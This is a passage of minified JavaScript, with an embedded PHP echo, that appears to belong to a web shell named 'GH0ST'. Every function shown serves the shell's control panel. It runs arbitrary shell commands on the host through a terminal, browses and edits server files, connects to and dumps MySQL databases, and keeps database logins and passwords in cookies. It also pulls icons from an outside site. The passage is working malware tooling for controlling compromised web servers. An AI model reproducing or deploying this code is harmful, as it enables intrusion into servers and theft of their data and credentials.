t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function GH0STMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");GH0STMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{GH0ST2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),GH0STMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function GH0STRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function GH0STLogOut(){GH0STRemoveCookie("GH0STUser"),GH0STRemoveCookie("GH0STPass"),location.reload()}var GH0STAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function GH0STShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new GH0STAlertBox("#alert-area",r).show(e)}function GH0STSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(GH0ST_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(GH0ST_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(GH0ST_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+GH0ST_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="GH0ST_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),GH0STShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&GH0STUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),GH0ST_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(GH0ST_can_add_opt){GH0ST_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="GH0ST Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'GH0STBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'GH0STBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),GH0STShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&GH0STUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'GH0STBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'GH0STBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function GH0STBeforeDoAction(e){GH0ST_before_do_action_id=e}function GH0STLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function GH0STAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_GH0ST_AJAX_.hasOwnProperty(t)&&_GH0ST_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,GH0ST_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),GH0STFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),GH0STUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),GH0STUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;GH0ST_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),GH0STUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),GH0STUpdateOptionsBadge("editor")}function GH0STUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function GH0STOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"GH0STTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="GH0STExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="GH0STWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="GH0STExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="GH0STOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",GH0STTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=GH0STGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function GH0STTerminalSetColorAndSize(e){var t=getCookie("GH0ST-terminal-color"),a=getCookie("GH0ST-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function GH0STTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("GH0ST-terminal-color",e.value,2012)}function GH0STGetTerminalHistory(e){var t=getCookie("GH0ST-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("GH0ST-terminal-fontsize",l,2012)}function GH0STWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=GH0STGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=GH0STGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("GH0ST-terminal-history","",2012)}function GH0STAceToFullscreen(e){var t=e.getAttribute("ace_id");GH0ST_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return GH0ST_ace_editors.eval[t].getValue()}function GH0STOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+GH0STb64("open_archive_dir")+"&c="+GH0STb64(c_)+"&GH0ST1="+GH0STb64(t)+"&GH0ST2="+GH0STb64(i)+"&ajax="+GH0STb64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="GH0STOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function GH0STDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),GH0STConnectionHistoryUpdate(e)}function GH0STConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("GH0ST_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function GH0STShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("GH0ST_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'GH0STConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'GH0STDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function GH0STConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("GH0ST_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("GH0ST_connection_hist",btoa(JSON.stringify(a)),2012)}function GH0STExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");GH0STloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+GH0STb64("terminalExec")+"&c="+GH0STb64(l)+"&GH0ST1="+GH0STb64(a)+"&ajax="+GH0STb64("true");if(_Ajax(d.URL,r,function(e,t){GH0STloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),GH0STShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&GH0STUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=GH0STGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("GH0ST-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+GH0ST_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function GH0STColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function GH0STgetFlags(){data="a="+GH0STb64("get_flags")+"&c="+GH0STb64(c_)+"&ajax="+GH0STb64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function GH0STCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(GH0ST_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function GH0STFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),GH0STSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var 